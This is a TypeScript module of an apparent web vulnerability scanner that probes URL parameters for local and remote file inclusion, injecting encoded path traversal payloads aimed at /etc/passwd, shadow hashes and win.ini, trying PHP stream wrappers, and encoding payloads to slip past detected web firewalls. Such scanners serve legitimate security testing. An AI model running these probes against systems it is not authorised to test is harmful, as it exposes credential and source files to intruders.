import { LFI_PAYLOADS, LFI_SUCCESS_PATTERNS } from "../payloads";
import { makeRequest, extractParameters, injectPayload, sleep } from "../utils";
import { InsertVulnerability } from "@shared/schema";
import { DefenseAwareness, EncodingStrategy } from "../defense-awareness";

interface LFIResult {
  vulnerable: boolean;
  type: "lfi" | "rfi" | "path-traversal";
  payload: string;
  evidence: string;
  parameter: string;
  confidence: "high" | "medium" | "low";
  contentVerified: boolean;
}

interface ContentFingerprint {
  name: string;
  patterns: RegExp[];
  required: number;
}

const TRAVERSAL_ENCODINGS = {
  single: ["../", "..\\"],
  double: ["%252e%252e/", "%252e%252e%255c"],
  utf8: ["..%c0%af", "..%c1%9c", "%c0%ae%c0%ae/"],
  mixed: ["....//", "..../", "....\\\\", "%2e%2e%2f", "%2e%2e/", "..%2f"],
};

const CONTENT_FINGERPRINTS: ContentFingerprint[] = [
  {
    name: "unix_passwd",
    patterns: [/root:[x*]?:\d+:\d+:/, /daemon:[x*]?:\d+:\d+:/, /nobody:[x*]?:\d+:\d+:/],
    required: 2,
  },
  {
    name: "unix_shadow",
    patterns: [/root:\$[0-9a-z]+\$/, /\$6\$[a-zA-Z0-9./]+\$/],
    required: 1,
  },
  {
    name: "php_source",
    patterns: [/<\?php/, /<\?=/, /\$_(?:GET|POST|REQUEST|SESSION|COOKIE)\[/],
    required: 1,
  },
  {
    name: "windows_ini",
    patterns: [/\[extensions\]/i, /\[fonts\]/i, /; for 16-bit app support/i],
    required: 1,
  },
  {
    name: "linux_hosts",
    patterns: [/127\.0\.0\.1\s+localhost/, /::1\s+localhost/],
    required: 1,
  },
];

export class LFIModule {
  private targetUrl: string;
  private foundVulnerabilities: LFIResult[] = [];
  private onLog: (level: string, message: string) => Promise<void>;
  private onVuln: (vuln: Omit<InsertVulnerability, "scanId">) => Promise<void>;

  private abortSignal?: AbortSignal;

  constructor(
    targetUrl: string,
    onLog: (level: string, message: string) => Promise<void>,
    onVuln: (vuln: Omit<InsertVulnerability, "scanId">) => Promise<void>,
    private defenseAwareness?: DefenseAwareness,
    private executionController?: { recordRequest: () => Promise<void> },
    abortSignal?: AbortSignal
  ) {
    this.targetUrl = targetUrl;
    this.onLog = onLog;
    this.onVuln = onVuln;
    this.abortSignal = abortSignal;
  }

  private async request(url: string, options: Parameters<typeof makeRequest>[1] = {}): Promise<ReturnType<typeof makeRequest>> {
    return makeRequest(url, { ...options, signal: this.abortSignal });
  }

  private getEncodedPayload(payload: string): string {
    if (!this.defenseAwareness) return payload;
    const wafProfile = this.defenseAwareness.getWAFProfile();
    if (!wafProfile.detected) return payload;
    const strategy = wafProfile.bypassStrategies[0] || "url_encode";
    return this.defenseAwareness.encodePayload(payload, strategy);
  }

  private getNextDelay(): number {
    return this.defenseAwareness?.getCurrentDelay() || 50;
  }

  private async trackAndPace(): Promise<void> {
    try {
      await this.executionController?.recordRequest();
    } catch (error) {
    }
    const delay = this.getNextDelay();
    if (delay > 0) {
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  }

  async scan(urlsToTest: string[]): Promise<LFIResult[]> {
    await this.onLog("info", "Starting LFI/RFI scan module...");
    
    for (const url of urlsToTest) {
      const params = extractParameters(url);
      
      if (params.length === 0) {
        // Test with common file inclusion parameters
        const testUrls = [
          `${url}?page=home`,
          `${url}?file=index`,
          `${url}?path=main`,
          `${url}?template=default`,
          `${url}?include=header`,
          `${url}?doc=readme`,
          `${url}?lang=en`,
          `${url}?module=main`,
        ];
        
        for (const testUrl of testUrls) {
          await this.testUrl(testUrl);
        }
      } else {
        await this.testUrl(url);
      }
    }

    return this.foundVulnerabilities;
  }

  private async testUrl(url: string): Promise<void> {
    const params = extractParameters(url);
    
    // Look for parameters that likely handle file paths
    const fileParams = params.filter(p => 
      /file|path|page|template|include|doc|module|lang|dir|load|read|view/i.test(p.name)
    );

    // If no file-related params found, test all params
    const paramsToTest = fileParams.length > 0 ? fileParams : params;
    
    for (const param of paramsToTest) {
      await this.onLog("info", `Testing parameter '${param.name}' for LFI/RFI...`);
      
      // Get baseline
      await this.trackAndPace();
      const baseline = await this.request(url);
      if (baseline.error) continue;

      // Test basic path traversal
      await this.testBasicLFI(url, param.name, baseline);

      // Test null byte injection
      await this.testNullByte(url, param.name);

      // Test PHP wrappers
      await this.testPHPWrappers(url, param.name);

      // Test Windows paths
      await this.testWindowsPaths(url, param.name);

      // Test RFI (if enabled, careful with this)
      await this.testRFI(url, param.name);
    }
  }

  private generateTraversalPayloads(targetFile: string, maxDepth: number = 8): string[] {
    const payloads: string[] = [];
    const encodings = [
      ...TRAVERSAL_ENCODINGS.single,
      ...TRAVERSAL_ENCODINGS.double,
      ...TRAVERSAL_ENCODINGS.utf8,
      ...TRAVERSAL_ENCODINGS.mixed,
    ];
    
    for (const encoding of encodings) {
      for (let depth = 1; depth <= maxDepth; depth++) {
        const traversal = encoding.repeat(depth);
        payloads.push(`${traversal}${targetFile}`);
      }
    }
    
    return payloads;
  }

  private verifyContentFingerprint(body: string, baseline: string): { verified: boolean; fingerprint: string | null; matchCount: number } {
    for (const fp of CONTENT_FINGERPRINTS) {
      let matchCount = 0;
      for (const pattern of fp.patterns) {
        if (pattern.test(body) && !pattern.test(baseline)) {
          matchCount++;
        }
      }
      if (matchCount >= fp.required) {
        return { verified: true, fingerprint: fp.name, matchCount };
      }
    }
    return { verified: false, fingerprint: null, matchCount: 0 };
  }

  private async testBasicLFI(url: string, paramName: string, baseline: any): Promise<void> {
    const targetFiles = ["etc/passwd", "etc/hosts", "windows/win.ini", "windows/system.ini"];
    
    for (const targetFile of targetFiles) {
      const payloads = this.generateTraversalPayloads(targetFile);
      
      for (const payload of payloads.slice(0, 20)) {
        await this.trackAndPace();
        const testUrl = injectPayload(url, paramName, payload);
        const response = await this.request(testUrl);

        if (response.error) continue;

        const fpResult = this.verifyContentFingerprint(response.body, baseline.body);
        
        if (fpResult.verified) {
          const result: LFIResult = {
            vulnerable: true,
            type: "lfi",
            payload,
            evidence: `Content fingerprint matched: ${fpResult.fingerprint} (${fpResult.matchCount} patterns)`,
            parameter: paramName,
            confidence: "high",
            contentVerified: true,
          };

          this.foundVulnerabilities.push(result);
          await this.reportVulnerability(result, url);
          return;
        }

        for (const pattern of LFI_SUCCESS_PATTERNS) {
          if (response.body.includes(pattern) && !baseline.body.includes(pattern)) {
            const result: LFIResult = {
              vulnerable: true,
              type: "lfi",
              payload,
              evidence: pattern,
              parameter: paramName,
              confidence: "high",
              contentVerified: true,
            };

            this.foundVulnerabilities.push(result);
            await this.reportVulnerability(result, url);
            return;
          }
        }

        await sleep(50);
      }
    }
    
    for (const payload of LFI_PAYLOADS.basic) {
      await this.trackAndPace();
      const encodedPayload = this.getEncodedPayload(payload);
      const testUrl = injectPayload(url, paramName, encodedPayload);
      const response = await this.request(testUrl);

      if (response.error) continue;

      const fpResult = this.verifyContentFingerprint(response.body, baseline.body);
      
      if (fpResult.verified) {
        const result: LFIResult = {
          vulnerable: true,
          type: "lfi",
          payload,
          evidence: `Content fingerprint matched: ${fpResult.fingerprint} (${fpResult.matchCount} patterns)`,
          parameter: paramName,
          confidence: "high",
          contentVerified: true,
        };

        this.foundVulnerabilities.push(result);
        await this.reportVulnerability(result, url);
        return;
      }

      for (const pattern of LFI_SUCCESS_PATTERNS) {
        if (response.body.includes(pattern)) {
          if (!baseline.body.includes(pattern)) {
            const result: LFIResult = {
              vulnerable: true,
              type: "lfi",
              payload,
              evidence: pattern,
              parameter: paramName,
              confidence: "high",
              contentVerified: true,
            };

            this.foundVulnerabilities.push(result);
            await this.reportVulnerability(result, url);
            return;
          }
        }
      }

      if (response.body.match(/\w+:\w?:\d+:\d+:/)) {
        const result: LFIResult = {
          vulnerable: true,
          type: "lfi",
          payload,
          evidence: "Unix passwd file format detected",
          parameter: paramName,
          confidence: "high",
          contentVerified: true,
        };

        this.foundVulnerabilities.push(result);
        await this.reportVulnerability(result, url);
        return;
      }

      await sleep(50);
    }
  }

  private async testNullByte(url: string, paramName: string): Promise<void> {
    await this.trackAndPace();
    const baseline = await this.request(url);
    
    for (const payload of LFI_PAYLOADS.nullByte) {
      await this.trackAndPace();
      const encodedPayload = this.getEncodedPayload(payload);
      const testUrl = injectPayload(url, paramName, encodedPayload);
      const response = await this.request(testUrl);

      if (response.error) continue;

      const fpResult = this.verifyContentFingerprint(response.body, baseline.body);
      
      if (fpResult.verified) {
        const result: LFIResult = {
          vulnerable: true,
          type: "lfi",
          payload,
          evidence: `Null byte bypass + content verified: ${fpResult.fingerprint}`,
          parameter: paramName,
          confidence: "high",
          contentVerified: true,
        };

        this.foundVulnerabilities.push(result);
        await this.reportVulnerability(result, url);
        return;
      }

      for (const pattern of LFI_SUCCESS_PATTERNS) {
        if (response.body.includes(pattern) && !baseline.body.includes(pattern)) {
          const result: LFIResult = {
            vulnerable: true,
            type: "lfi",
            payload,
            evidence: `Null byte bypass successful: ${pattern}`,
            parameter: paramName,
            confidence: "high",
            contentVerified: true,
          };

          this.foundVulnerabilities.push(result);
          await this.reportVulnerability(result, url);
          return;
        }
      }

      await sleep(50);
    }
  }

  private async testPHPWrappers(url: string, paramName: string): Promise<void> {
    for (const payload of LFI_PAYLOADS.phpWrappers) {
      await this.trackAndPace();
      const encodedPayload = this.getEncodedPayload(payload);
      const testUrl = injectPayload(url, paramName, encodedPayload);
      const response = await this.request(testUrl);

      if (response.error) continue;

      if (payload.includes("base64-encode")) {
        const base64Match = response.body.match(/[A-Za-z0-9+/]{50,}={0,2}/);
        if (base64Match) {
          try {
            const decoded = Buffer.from(base64Match[0], "base64").toString("utf-8");
            const phpMarkers = ["<?php", "<?=", "$_GET", "$_POST", "$_REQUEST", "function ", "class "];
            const matchedMarkers = phpMarkers.filter(m => decoded.includes(m));
            
            if (matchedMarkers.length >= 1) {
              const result: LFIResult = {
                vulnerable: true,
                type: "lfi",
                payload,
                evidence: `PHP source code disclosed via php://filter wrapper. Markers found: ${matchedMarkers.join(", ")}`,
                parameter: paramName,
                confidence: "high",
                contentVerified: true,
              };

              this.foundVulnerabilities.push(result);
              await this.reportVulnerability(result, url);
              return;
            }
          } catch {}
        }
      }

      if (payload === "php://input") {
        await this.onLog("info", `Potential php://input vector found on ${paramName}`);
      }

      if (payload.includes("expect://")) {
        await this.onLog("info", `Testing expect:// wrapper on ${paramName}`);
      }

      await sleep(50);
    }
  }

  private async testWindowsPaths(url: string, paramName: string): Promise<void> {
    await this.trackAndPace();
    const baseline = await this.request(url);
    
    for (const payload of LFI_PAYLOADS.windows) {
      await this.trackAndPace();
      const encodedPayload = this.getEncodedPayload(payload);
      const testUrl = injectPayload(url, paramName, encodedPayload);
      const response = await this.request(testUrl);

      if (response.error) continue;

      const fpResult = this.verifyContentFingerprint(response.body, baseline.body);
      
      if (fpResult.verified) {
        const result: LFIResult = {
          vulnerable: true,
          type: "lfi",
          payload,
          evidence: `Windows file disclosure + content verified: ${fpResult.fingerprint}`,
          parameter: paramName,
          confidence: "high",
          contentVerified: true,
        };

        this.foundVulnerabilities.push(result);
        await this.reportVulnerability(result, url);
        return;
      }

      for (const pattern of LFI_SUCCESS_PATTERNS) {
        if (response.body.includes(pattern) && !baseline.body.includes(pattern)) {
          const result: LFIResult = {
            vulnerable: true,
            type: "lfi",
            payload,
            evidence: `Windows file disclosure: ${pattern}`,
            parameter: paramName,
            confidence: "high",
            contentVerified: true,
          };

          this.foundVulnerabilities.push(result);
          await this.reportVulnerability(result, url);
          return;
        }
      }

      await sleep(50);
    }
  }

  private async testRFI(url: string, paramName: string): Promise<void> {
    // Get baseline to compare
    await this.trackAndPace();
    const baseline = await this.request(url);
    if (baseline.error) return;
    
    // RFI testing - check for specific content from remote URL, not just URL string
    // We need to verify that actual HTML content from the remote source is included
    const testCases = [
      {
        rfiUrl: "https://httpbin.org/html",
        // This is actual content from httpbin.org/html response - unique identifiers
        patterns: ["Herman Melville - Moby-Dick", "Call me Ishmael", "MOBY-DICK"],
      },
      {
        rfiUrl: "http://example.com/test.txt", 
        // example.com returns a specific page
        patterns: ["This domain is for use in illustrative examples"],
      },
    ];

    for (const testCase of testCases) {
      await this.trackAndPace();
      const testUrl = injectPayload(url, paramName, testCase.rfiUrl);
      const response = await this.request(testUrl);

      if (response.error) continue;

      // Check if the response contains ACTUAL content from the remote URL
      // Not just the URL string appearing in error messages
      let matchedPattern: string | null = null;
      for (const pattern of testCase.patterns) {
        // Pattern must not be in baseline - ensures it's actually included
        if (response.body.includes(pattern) && !baseline.body.includes(pattern)) {
          matchedPattern = pattern;
          break;
        }
      }
      
      if (matchedPattern) {
        const result: LFIResult = {
          vulnerable: true,
          type: "rfi",
          payload: testCase.rfiUrl,
          evidence: `Remote content included: "${matchedPattern.substring(0, 50)}..."`,
          parameter: paramName,
          confidence: "high",
          contentVerified: true,
        };

        this.foundVulnerabilities.push(result);
        await this.reportVulnerability(result, url);
        return;
      }

      await sleep(50);
    }
  }

  private async reportVulnerability(result: LFIResult, url: string): Promise<void> {
    const verificationStatus = result.contentVerified && result.confidence === "high" ? "confirmed" : "potential";
    const confidenceScore = result.contentVerified ? 
      (result.confidence === "high" ? 95 : result.confidence === "medium" ? 75 : 60) : 
      (result.confidence === "high" ? 70 : result.confidence === "medium" ? 55 : 40);

    await this.onLog("warn", `${result.type.toUpperCase()} found in parameter '${result.parameter}' - ${verificationStatus.toUpperCase()} (${confidenceScore}%)`);

    const severityMap: Record<string, string> = {
      "lfi": "Critical",
      "rfi": "Critical",
      "path-traversal": "High",
    };

    const verificationDetails = this.getVerificationDetails(result, verificationStatus);

    await this.onVuln({
      type: result.type === "rfi" ? "Remote File Inclusion" : "Local File Inclusion",
      severity: severityMap[result.type] || "High",
      verificationStatus,
      confidence: confidenceScore,
      url,
      parameter: result.parameter,
      payload: result.payload,
      evidence: result.evidence,
      verificationDetails,
      description: this.getDescription(result.type),
      remediation: "Validate file paths against a whitelist of allowed files. Never use user input directly in file operations. Use absolute paths and avoid path traversal sequences. Disable allow_url_include in PHP configuration.",
    });
  }

  private getVerificationDetails(result: LFIResult, status: string): string {
    if (status === "confirmed") {
      if (result.type === "rfi") {
        return `CONFIRMED: Remote file inclusion verified by detecting unique content from the remote source in the response. This proves the server fetched and included external content. Evidence: ${result.evidence}`;
      }
      return `CONFIRMED: Local file inclusion verified through content fingerprinting. File content matches expected format (e.g., /etc/passwd structure, PHP source markers). Evidence: ${result.evidence}`;
    } else {
      if (result.type === "rfi") {
        return `POTENTIAL: Response behavior suggests possible remote file inclusion, but unique remote content could not be verified. Manual testing recommended.`;
      }
      return `POTENTIAL: Response behavior suggests possible file inclusion (path traversal sequences accepted, response changes), but file content could not be positively fingerprinted. Manual verification required.`;
    }
  }

  private getDescription(type: string): string {
    switch (type) {
      case "lfi":
        return "Local File Inclusion was detected. An attacker can read sensitive files from the server, including configuration files, source code, and system files like /etc/passwd.";
      case "rfi":
        return "Remote File Inclusion was detected. An attacker can include and execute malicious code from external servers, leading to complete server compromise.";
      case "path-traversal":
        return "Path Traversal vulnerability detected. An attacker can navigate outside the intended directory to access files on the server.";
      default:
        return "File inclusion vulnerability detected. An attacker may be able to read or execute arbitrary files.";
    }
  }
}
